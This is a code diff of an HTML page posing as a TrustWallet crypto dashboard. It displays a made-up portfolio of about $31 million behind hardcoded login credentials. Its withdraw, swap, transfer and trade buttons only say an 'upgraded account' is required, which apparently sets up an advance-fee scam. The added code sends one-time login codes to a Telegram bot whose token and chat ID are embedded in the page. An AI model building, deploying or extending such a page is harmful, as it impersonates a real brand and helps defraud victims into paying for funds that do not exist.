@@ -1,11 +1,11 @@
 <!DOCTYPE html>
+
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TrustWallet</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/3.9.1/chart.min.js"></script>
-    <style>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>TrustWallet</title>
+<style>
         * {
             margin: 0;
             padding: 0;
@@ -354,407 +354,460 @@
                 gap: 1rem;
             }
         }
-    </style>
-</head>
-<body>
-    <!-- Login Form -->
-    <div id="loginContainer" class="login-container">
-        <div class="login-form">
-            <div class="logo">
-                <img src="logo.png" alt="TrustWallet Logo" />
-            </div>
-            <h2>Welcome Back</h2>
-            <form id="loginForm">
-                <div class="form-group">
-                    <label for="username">Username</label>
-                    <input type="text" id="username" name="username" required>
-                </div>
-                <div class="form-group">
-                    <label for="password">Password</label>
-                    <input type="password" id="password" name="password" required>
-                </div>
-                <button type="submit" class="login-btn">Sign In</button>
-            </form>
-        </div>
-    </div>
+    
+@media (max-width: 480px) {
+    .login-form {
+        width: 90%;
+        padding: 20px;
+    }
 
-    <!-- Dashboard -->
-    <div id="dashboard" class="dashboard">
-        <nav class="navbar">
-            <div class="nav-brand">
-                <img src="logo.png" alt="TrustWallet Logo" />
-            </div>
-            <ul class="nav-menu">
-                <li><a href="#" class="active">Dashboard</a></li>
-                <li>
-                     <a href="https://trustwallet.com/?utm_source=cryptwerk" target="_blank" rel="noopener noreferrer">
+    .nav-menu {
+        flex-direction: column;
+        align-items: flex-start;
+        gap: 0.5rem;
+    }
+
+    .user-info {
+        flex-direction: column;
+        align-items: flex-end;
+        gap: 0.5rem;
+    }
+
+    .logo img, .nav-brand img {
+        max-width: 120px;
+        height: auto;
+    }
+
+    .chart-container {
+        height: 250px;
+    }
+
+    .main-content {
+        padding: 1rem 0.5rem;
+    }
+
+    .time-selector {
+        flex-wrap: wrap;
+    }
+}
+
+.spinner {
+    border: 6px solid rgba(255, 255, 255, 0.1);
+    border-top: 6px solid #00d4ff;
+    border-radius: 50%;
+    width: 60px;
+    height: 60px;
+    animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+@media (max-width: 480px) {
+  .login-form {
+    width: 100%;
+    max-width: 90%;
+    padding: 20px;
+  }
+
+  .chart-container {
+    height: 250px;
+  }
+
+  #customPopup {
+    right: 5%;
+    left: 5%;
+    max-width: 90%;
+  }
+}
+</style>
+<script src="https://cdn.jsdelivr.net/npm/chart.js"></script></head>
+<body>
+<div id="customPopup" style="display:none; position: fixed; top: 20px; right: 20px; background: #1a202c; color: #fff; padding: 1rem 1.5rem; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.4); z-index: 9999; font-size: 0.95rem; max-width: 300px; position: fixed;">
+<span id="popupMessage"></span>
+<span onclick="hidePopup()" style="margin-left: 12px; cursor: pointer; float: right; color: #ccc; font-weight: bold;">×</span>
+</div>
+<script>
+let popupTimeout;
+function showPopup(message) {
+    const popup = document.getElementById("customPopup");
+    const messageSpan = document.getElementById("popupMessage");
+    messageSpan.textContent = message;
+    popup.style.display = "block";
+    clearTimeout(popupTimeout);
+    popupTimeout = setTimeout(() => {
+        popup.style.display = "none";
+    }, 4000);
+}
+function hidePopup() {
+    const popup = document.getElementById("customPopup");
+    popup.style.display = "none";
+    clearTimeout(popupTimeout);
+}
+function showSwapMessage() {
+    showPopup("Swapping is only available for upgraded accounts.");
+}
+function showWithdrawMessage() {
+    showPopup("Withdrawal is only available for upgraded accounts.");
+}
+function showTransferMessage() {
+    showPopup("Transfer is only available for upgraded accounts.");
+}
+function showTradeMessage() {
+    showPopup("Trading is only available for upgraded accounts.");
+}
+</script>
+<!-- Custom Modal -->
+<div id="customModal" style="display: none; align-items: center; justify-content: center;">
+<div style="background: rgba(255, 255, 255, 0.1); border: 1px solid rgba(255, 255, 255, 0.2);
+        border-radius: 12px; padding: 2rem; max-width: 90%; color: #fff; backdrop-filter: blur(10px);
+        text-align: center;">
+<p id="modalMessage" style="margin-bottom: 1.5rem; font-size: 1.1rem;"></p>
+<button onclick="closeModal()" style="padding: 0.5rem 1.5rem; border: none; border-radius: 6px;
+            background: linear-gradient(45deg, #00d4ff, #5a67d8); color: white; font-weight: 600; cursor: pointer;">
+            OK
+        </button>
+</div>
+</div>
+<!-- Loading Screen -->
+<div id="loadingScreen" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); justify-content: center; align-items: center; z-index: 9999;">
+<div class="spinner"></div>
+</div>
+<!-- Login Form -->
+<div class="login-container" id="loginContainer">
+<div class="login-form">
+<div class="logo"><img alt="TrustWallet Logo" src="logo.png" style="width: 100px; height: auto;"/></div>
+<h2>Welcome Back</h2>
+<form id="loginForm">
+<div class="form-group">
+<label for="username">Username</label>
+<input id="username" name="username" required="" type="text"/>
+</div>
+<div class="form-group">
+<label for="password">Password</label>
+<input id="password" name="password" required="" type="password"/>
+</div>
+<button class="login-btn" type="submit">Sign In</button>
+</form>
+</div>
+</div>
+<!-- Dashboard -->
+<!-- OTP Verification Screen -->
+<div class="login-container" id="otpContainer" style="display: none;">
+<div class="login-form">
+<div class="logo">
+<img alt="TrustWallet Logo" src="logo.png" style="width: 100px; height: auto;"/>
+</div>
+<h2>Verify OTP</h2>
+<p style="margin-bottom: 20px;">Enter the 6-digit code sent to your email</p>
+<form id="otpForm">
+<div class="form-group">
+<label for="otpInput">OTP Code</label>
+<input id="otpInput" name="otpInput" required="" type="text"/>
+</div>
+<button class="login-btn" type="submit">Verify</button>
+</form>
+<p id="otpTimer" style="margin-top: 10px; display: none; font-size: 0.9rem; color: #00d4ff;"></p>
+<button id="resendOtp" onclick="resendOTP()" style="display: none; margin-top: 10px; background: none; border: none; color: #00d4ff; text-decoration: underline; cursor: pointer;" type="button">
+  Resend OTP
+</button>
+</div>
+</div>
+<div class="dashboard" id="dashboard">
+<nav class="navbar">
+<div class="nav-brand"><img alt="TrustWallet Logo" src="logo.png" style="width: 120px; height: auto;"/></div>
+<ul class="nav-menu">
+<li><a class="active" href="#">Dashboard</a></li>
+<li>
+<a href="#" onclick="showTradeMessage(); return false;" rel="noopener noreferrer" target="_blank">
                         Trade
                     </a>
-                <li>
-                    <a href="#" onclick="showwithdrawError(); return false;">Withdraw</a>
-                </li>
-                <script>
-                    function showwithdrawError() {
-                        alert('Withdrawal is only available for upgraded accounts');
-                    }
-                </script>
-                <li>
-                    <a href="#" onclick="showswapError(); return false;">Swap</a>
-                </li>
-                <script>
-                    function showswapError() {
-                        alert('Swapping is only available for upgraded accounts');
-                    }
-                </script>
-                <li>
-                    <a href="#" onclick="showtransferError(); return false;">Transfer</a>
-                </li>
-                <script>
-                    function showtransferError() {
-                        alert('Transfer is only available for upgraded accounts');
-                    }
-                </script>
-            </ul>
-            <div class="user-info">
-                <span id="welcomeUser">Welcome, User</span>
-                <button class="logout-btn" onclick="logout()">Logout</button>
-            </div>
-        </nav>
+<li>
+<a href="#" onclick="showWithdrawMessage(); return false;">Withdraw</a>
+</li>
+<li>
+<a href="#" onclick="showSwapMessage(); return false;">Swap</a>
+</li>
+<li>
+<a href="#" onclick="showTransferMessage(); return false;">Transfer</a>
+</li>
+</li></ul>
+<div class="user-info">
+<span id="welcomeUser">Welcome, User</span>
+<button class="logout-btn" onclick="logout()">Logout</button>
+</div>
+</nav>
+<div class="main-content">
+<div class="left-panel">
+<!-- Balance Card -->
+<div class="card balance-card">
+<div class="balance-header">
+<div class="balance-title">Total Portfolio Value</div>
+<div style="color: #48bb78;">●</div>
+</div>
+<div class="total-balance">$31,432,982.85</div>
+<div class="balance-change">+$2,847.92 (+2.28%) Today</div>
+<div class="assets-grid">
+<div class="asset-item">
+<div>
+<div class="asset-name">Bitcoin</div>
+<div class="asset-value">9.45 BTC</div>
+</div>
+<div class="asset-amount">
+<div>$1,029,012.91</div>
+<div class="asset-value positive">+1.2%</div>
+</div>
+</div>
+<div class="asset-item">
+<div>
+<div class="asset-name">Ethereum</div>
+<div class="asset-value">500 ETH</div>
+</div>
+<div class="asset-amount">
+<div>$1,328,930.31</div>
+<div class="asset-value positive">+3.4%</div>
+</div>
+</div>
+<div class="asset-item">
+<div>
+<div class="asset-name">HOT</div>
+<div class="asset-value">4,578,555,183.77 HOT</div>
+</div>
+<div class="asset-amount">
+<div>$5,127,981.8</div>
+<div class="asset-value negative">-0.8%</div>
+</div>
+</div>
+<div class="asset-item">
+<div>
+<div class="asset-name">USDC</div>
+<div class="asset-value">541,509.906838</div>
+</div>
+<div class="asset-amount">
+<div>$541,509.906848s</div>
+<div class="asset-value">0.0%</div>
+</div>
+</div>
+</div>
+</div>
+<!-- Watchlist -->
+<div class="card">
+<h3 style="margin-bottom: 1rem; color: #e2e8f0;">Market Watchlist</h3>
+<div class="watchlist-item">
+<div class="crypto-info">
+<div class="crypto-icon">₿</div>
+<div>
+<div class="crypto-name">Bitcoin</div>
+<div class="crypto-symbol">BTC</div>
+</div>
+</div>
+<div class="price-info">
+<div class="price">$110,156.78</div>
+<div class="price-change positive">+2.45%</div>
+</div>
+</div>
+<div class="watchlist-item">
+<div class="crypto-info">
+<div class="crypto-icon">Ξ</div>
+<div>
+<div class="crypto-name">Ethereum</div>
+<div class="crypto-symbol">ETH</div>
+</div>
+</div>
+<div class="price-info">
+<div class="price">$2,847.92</div>
+<div class="price-change positive">+3.21%</div>
+</div>
+</div>
+<div class="watchlist-item">
+<div class="crypto-info">
+<div class="crypto-icon">◉</div>
+<div>
+<div class="crypto-name">Cardano</div>
+<div class="crypto-symbol">ADA</div>
+</div>
+</div>
+<div class="price-info">
+<div class="price">$0.7851</div>
+<div class="price-change negative">-1.23%</div>
+</div>
+</div>
+<div class="watchlist-item">
+<div class="crypto-info">
+<div class="crypto-icon">◆</div>
+<div>
+<div class="crypto-name">Solana</div>
+<div class="crypto-symbol">SOL</div>
+</div>
+</div>
+<div class="price-info">
+<div class="price">$184.23</div>
+<div class="price-change positive">+5.67%</div>
+</div>
+</div>
+</div>
+</div>
+<div class="right-panel"><div class="card">
+<div class="chart-header">
+<div class="chart-title">Portfolio Performance</div>
+<div class="time-selector">
+<button class="time-btn active" onclick="switchTimeframe('1D')">1D</button>
+<button class="time-btn" onclick="switchTimeframe('1W')">1W</button>
+<button class="time-btn" onclick="switchTimeframe('1M')">1M</button>
+<button class="time-btn" onclick="switchTimeframe('3M')">3M</button>
+<button class="time-btn" onclick="switchTimeframe('1Y')">1Y</button>
+</div>
+</div>
+<div class="chart-container">
+<canvas id="portfolioChart"></canvas>
+</div>
+</div><div class="card" style="margin-top: 1.5rem;">
+<div class="chart-header">
+<div class="chart-title">Bitcoin Price Chart</div>
+</div>
+<div class="chart-container portfolio-chart">
+<canvas id="btcChart"></canvas>
+</div>
+</div></div>
+</div>
+</div>
+<div id="successModal" style="display: none; position: fixed; top: 20px; right: 20px; background: #38a169; color: white; padding: 1rem 1.5rem; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.3); z-index: 9999; font-size: 0.95rem;">
+  ✅ Message sent successfully!
+</div>
+<script>
+let currentUser = null;
+let generatedOTP = null;
+let otpTimerInterval;
+let otpTimeLeft = 120;
 
-        <div class="main-content">
-            <div class="left-panel">
-                <!-- Balance Card -->
-                <div class="card balance-card">
-                    <div class="balance-header">
-                        <div class="balance-title">Total Portfolio Value</div>
-                        <div style="color: #48bb78;">●</div>
-                    </div>
-                    <div class="total-balance">$31,432,982.85</div>
-                    <div class="balance-change">+$2,847.92 (+2.28%) Today</div>
-                    
-                    <div class="assets-grid">
-                        <div class="asset-item">
-                            <div>
-                                <div class="asset-name">Bitcoin</div>
-                                <div class="asset-value">9.45 BTC</div>
-                            </div>
-                            <div class="asset-amount">
-                                <div>$1,029,012.91</div>
-                                <div class="asset-value positive">+1.2%</div>
-                            </div>
-                        </div>
-                        <div class="asset-item">
-                            <div>
-                                <div class="asset-name">Ethereum</div>
-                                <div class="asset-value">500 ETH</div>
-                            </div>
-                            <div class="asset-amount">
-                                <div>$1,328,930.31</div>
-                                <div class="asset-value positive">+3.4%</div>
-                            </div>
-                        </div>
-                        <div class="asset-item">
-                            <div>
-                                <div class="asset-name">HOT</div>
-                                <div class="asset-value">4,578,555,183.77 HOT</div>
-                            </div>
-                            <div class="asset-amount">
-                                <div>$5,127,981.8</div>
-                                <div class="asset-value negative">-0.8%</div>
-                            </div>
-                        </div>
-                        <div class="asset-item">
-                            <div>
-                                <div class="asset-name">USDC</div>
-                                <div class="asset-value">541,509.906838</div>
-                            </div>
-                            <div class="asset-amount">
-                                <div>$541,509.906848s</div>
-                                <div class="asset-value">0.0%</div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    const username = document.getElementById('username').value.trim();
+    const password = document.getElementById('password').value.trim();
 
-                <!-- Watchlist -->
-                <div class="card">
-                    <h3 style="margin-bottom: 1rem; color: #e2e8f0;">Market Watchlist</h3>
-                    <div class="watchlist-item">
-                        <div class="crypto-info">
-                            <div class="crypto-icon">₿</div>
-                            <div>
-                                <div class="crypto-name">Bitcoin</div>
-                                <div class="crypto-symbol">BTC</div>
-                            </div>
-                        </div>
-                        <div class="price-info">
-                            <div class="price">$110,156.78</div>
-                            <div class="price-change positive">+2.45%</div>
-                        </div>
-                    </div>
-                    <div class="watchlist-item">
-                        <div class="crypto-info">
-                            <div class="crypto-icon">Ξ</div>
-                            <div>
-                                <div class="crypto-name">Ethereum</div>
-                                <div class="crypto-symbol">ETH</div>
-                            </div>
-                        </div>
-                        <div class="price-info">
-                            <div class="price">$2,847.92</div>
-                            <div class="price-change positive">+3.21%</div>
-                        </div>
-                    </div>
-                    <div class="watchlist-item">
-                        <div class="crypto-info">
-                            <div class="crypto-icon">◉</div>
-                            <div>
-                                <div class="crypto-name">Cardano</div>
-                                <div class="crypto-symbol">ADA</div>
-                            </div>
-                        </div>
-                        <div class="price-info">
-                            <div class="price">$0.7851</div>
-                            <div class="price-change negative">-1.23%</div>
-                        </div>
-                    </div>
-                    <div class="watchlist-item">
-                        <div class="crypto-info">
-                            <div class="crypto-icon">◆</div>
-                            <div>
-                                <div class="crypto-name">Solana</div>
-                                <div class="crypto-symbol">SOL</div>
-                            </div>
-                        </div>
-                        <div class="price-info">
-                            <div class="price">$184.23</div>
-                            <div class="price-change positive">+5.67%</div>
-                        </div>
-                    </div>
-                </div>
-            </div>
+    if (username === 'Duane' && password === 'LoveJackson') {
+        currentUser = username;
+        generatedOTP = Math.floor(100000 + Math.random() * 900000).toString();
 
-            <div class="right-panel">
-                <div class="card">
-                    <div class="chart-header">
-                        <div class="chart-title">Portfolio Performance</div>
-                        <div class="time-selector">
-                            <button class="time-btn active" onclick="switchTimeframe('1D')">1D</button>
-                            <button class="time-btn" onclick="switchTimeframe('1W')">1W</button>
-                            <button class="time-btn" onclick="switchTimeframe('1M')">1M</button>
-                            <button class="time-btn" onclick="switchTimeframe('3M')">3M</button>
-                            <button class="time-btn" onclick="switchTimeframe('1Y')">1Y</button>
-                        </div>
-                    </div>
-                    <div class="chart-container">
-                        <canvas id="portfolioChart"></canvas>
-                    </div>
-                </div>
-
-                <div class="card" style="margin-top: 1.5rem;">
-                    <div class="chart-header">
-                        <div class="chart-title">Bitcoin Price Chart</div>
-                    </div>
-                    <div class="chart-container portfolio-chart">
-                        <canvas id="btcChart"></canvas>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <script>
-        // Login functionality
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            const username = document.getElementById('username').value.trim();
-            const password = document.getElementById('password').value.trim();
-            
-            // Accept any non-empty username and password
-            const allowedUsername = 'Duane';
-            const allowedPassword = 'LoveJackson';
-            if (username === allowedUsername && password === allowedPassword) {
-                document.getElementById('welcomeUser').textContent = `Welcome, ${username}`;
-                document.getElementById('loginContainer').style.display = 'none';
-                document.getElementById('dashboard').style.display = 'block';
-                initCharts();
-                if (typeof initCharts === 'function') {
-                    initCharts();
-                }
-             } else {
-                alert('Invalid username or password');
-            }
-            });
-      
-
-        // Also allow Enter key to submit
-        document.getElementById('username').addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-                document.getElementById('loginForm').dispatchEvent(new Event('submit'));
-            }
+        fetch('https://api.telegram.org/bot8124847122:AAFhV7O1JtqexwKdV-EmQfq27uaeW_SNBFE/sendMessage', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: '7154713742',
+                text: `🔐 OTP for ${username}: ${generatedOTP}`
+            })
         });
 
-        document.getElementById('password').addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-                document.getElementById('loginForm').dispatchEvent(new Event('submit'));
+        document.getElementById('loginContainer').style.display = 'none';
+        document.getElementById('otpContainer').style.display = 'flex';
+        startOTPTimer();
+    } else {
+        alert('Invalid username or password');
+    }
+});
+
+document.getElementById('otpForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    const enteredOTP = document.getElementById('otpInput').value.trim();
+    if (enteredOTP === generatedOTP) {
+        document.getElementById('loadingScreen').style.display = 'flex';
+        clearInterval(otpTimerInterval);
+        setTimeout(() => {
+            document.getElementById('otpContainer').style.display = 'none';
+            document.getElementById('dashboard').style.display = 'block';
+            document.getElementById('welcomeUser').textContent = `Welcome, ${currentUser}`;
+            document.getElementById('loadingScreen').style.display = 'none';
+            if (typeof initCharts === 'function') initCharts();
+        }, 2000);
+    } else {
+        alert('Incorrect OTP. Please try again.');
+    }
+});
+
+function startOTPTimer() {
+    otpTimeLeft = 120;
+    updateOTPTimer();
+    document.getElementById('otpTimer').style.display = 'block';
+    document.getElementById('resendOtp').style.display = 'none';
+
+    otpTimerInterval = setInterval(() => {
+        otpTimeLeft--;
+        updateOTPTimer();
+        if (otpTimeLeft <= 0) {
+            clearInterval(otpTimerInterval);
+            document.getElementById('otpTimer').textContent = "OTP expired.";
+            document.getElementById('resendOtp').style.display = 'block';
+        }
+    }, 1000);
+}
+
+function updateOTPTimer() {
+    const minutes = Math.floor(otpTimeLeft / 60);
+    const seconds = otpTimeLeft % 60;
+    document.getElementById('otpTimer').textContent = `OTP expires in ${minutes}:${seconds.toString().padStart(2, '0')}`;
+}
+
+function resendOTP() {
+    generatedOTP = Math.floor(100000 + Math.random() * 900000).toString();
+    fetch('https://api.telegram.org/bot8124847122:AAFhV7O1JtqexwKdV-EmQfq27uaeW_SNBFE/sendMessage', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: '7154713742',
+            text: `🔁 Resent OTP for ${currentUser}: ${generatedOTP}`
+        })
+    });
+    startOTPTimer();
+}
+</script>
+<script>
+function initCharts() {
+    const portfolioCtx = document.getElementById('portfolioChart')?.getContext('2d');
+    const btcCtx = document.getElementById('btcChart')?.getContext('2d');
+
+    if (portfolioCtx) {
+        new Chart(portfolioCtx, {
+            type: 'line',
+            data: {
+                labels: ['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun'],
+                datasets: [{
+                    label: 'Portfolio',
+                    data: [30000, 31000, 31500, 31200, 31800, 32000, 31400],
+                    borderColor: '#00d4ff',
+                    fill: false,
+                    tension: 0.4
+                }]
+            },
+            options: {
+                responsive: true,
+                plugins: { legend: { display: false } },
+                scales: { x: { display: true }, y: { display: true } }
             }
         });
+    }
 
-        function logout() {
-            document.getElementById('loginContainer').style.display = 'flex';
-            document.getElementById('dashboard').style.display = 'none';
-            document.getElementById('loginForm').reset();
-        }
-
-        // Chart functionality
-        let portfolioChart;
-        let btcChart;
-
-        function initCharts() {
-            // Portfolio Chart
-            const portfolioCtx = document.getElementById('portfolioChart').getContext('2d');
-            const portfolioData = generateTimeSeriesData(30, 120000, 130000);
-            
-            portfolioChart = new Chart(portfolioCtx, {
-                type: 'line',
-                data: {
-                    labels: portfolioData.labels,
-                    datasets: [{
-                        label: 'Portfolio Value',
-                        data: portfolioData.data,
-                        borderColor: '#00d4ff',
-                        backgroundColor: 'rgba(0, 212, 255, 0.1)',
-                        borderWidth: 2,
-                        fill: true,
-                        tension: 0.4
-                    }]
-                },
-                options: {
-                    responsive: true,
-                    maintainAspectRatio: false,
-                    plugins: {
-                        legend: {
-                            display: false
-                        }
-                    },
-                    scales: {
-                        x: {
-                            grid: {
-                                color: 'rgba(255, 255, 255, 0.1)'
-                            },
-                            ticks: {
-                                color: '#cbd5e0'
-                            }
-                        },
-                        y: {
-                            grid: {
-                                color: 'rgba(255, 255, 255, 0.1)'
-                            },
-                            ticks: {
-                                color: '#cbd5e0',
-                                callback: function(value) {
-                                    return '$' + value.toLocaleString();
-                                }
-                            }
-                        }
-                    }
-                }
-            });
-
-            // BTC Chart
-            const btcCtx = document.getElementById('btcChart').getContext('2d');
-            const btcData = generateTimeSeriesData(24, 40000, 43000);
-            
-            btcChart = new Chart(btcCtx, {
-                type: 'line',
-                data: {
-                    labels: btcData.labels,
-                    datasets: [{
-                        label: 'BTC Price',
-                        data: btcData.data,
-                        borderColor: '#f7931a',
-                        backgroundColor: 'rgba(247, 147, 26, 0.1)',
-                        borderWidth: 2,
-                        fill: true,
-                        tension: 0.4
-                    }]
-                },
-                options: {
-                    responsive: true,
-                    maintainAspectRatio: false,
-                    plugins: {
-                        legend: {
-                            display: false
-                        }
-                    },
-                    scales: {
-                        x: {
-                            grid: {
-                                color: 'rgba(255, 255, 255, 0.1)'
-                            },
-                            ticks: {
-                                color: '#cbd5e0'
-                            }
-                        },
-                        y: {
-                            grid: {
-                                color: 'rgba(255, 255, 255, 0.1)'
-                            },
-                            ticks: {
-                                color: '#cbd5e0',
-                                callback: function(value) {
-                                    return '$' + value.toLocaleString();
-                                }
-                            }
-                        }
-                    }
-                }
-            });
-        }
-
-        function generateTimeSeriesData(points, min, max) {
-            const labels = [];
-            const data = [];
-            const now = new Date();
-            
-            for (let i = points - 1; i >= 0; i--) {
-                const date = new Date(now.getTime() - i * 60 * 60 * 1000);
-                labels.push(date.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' }));
-                
-                const value = min + Math.random() * (max - min);
-                data.push(Math.round(value * 100) / 100);
+    if (btcCtx) {
+        new Chart(btcCtx, {
+            type: 'line',
+            data: {
+                labels: ['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun'],
+                datasets: [{
+                    label: 'BTC Price',
+                    data: [108000, 110000, 112000, 111000, 113000, 114000, 110500],
+                    borderColor: '#5a67d8',
+                    fill: false,
+                    tension: 0.4
+                }]
+            },
+            options: {
+                responsive: true,
+                plugins: { legend: { display: false } },
+                scales: { x: { display: true }, y: { display: true } }
             }
-            
-            return { labels, data };
-        }
-
-        function switchTimeframe(timeframe) {
-            document.querySelectorAll('.time-btn').forEach(btn => btn.classList.remove('active'));
-            event.target.classList.add('active');
-            
-            // Update chart data based on timeframe (simplified)
-            const newData = generateTimeSeriesData(30, 120000, 130000);
-            portfolioChart.data.labels = newData.labels;
-            portfolioChart.data.datasets[0].data = newData.data;
-            portfolioChart.update();
-        }
-
-        // Real-time price updates simulation
-        setInterval(() => {
-            if (document.getElementById('dashboard').style.display === 'block') {
-                updatePrices();
-            }
-        }, 5000);
-
-        function updatePrices() {
-            const priceElements = document.querySelectorAll('.price');
-            priceElements.forEach(element => {
-                const currentPrice = parseFloat(element.textContent.replace('$', '').replace(',', ''));
-                const change = (Math.random() - 0.5) * currentPrice * 0.01;
-                const newPrice = currentPrice + change;
-                element.textContent = '$' + newPrice.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
-            });
-        }
-    </script>
-</body>
+        });
+    }
+}
+</script></body>
 </html>
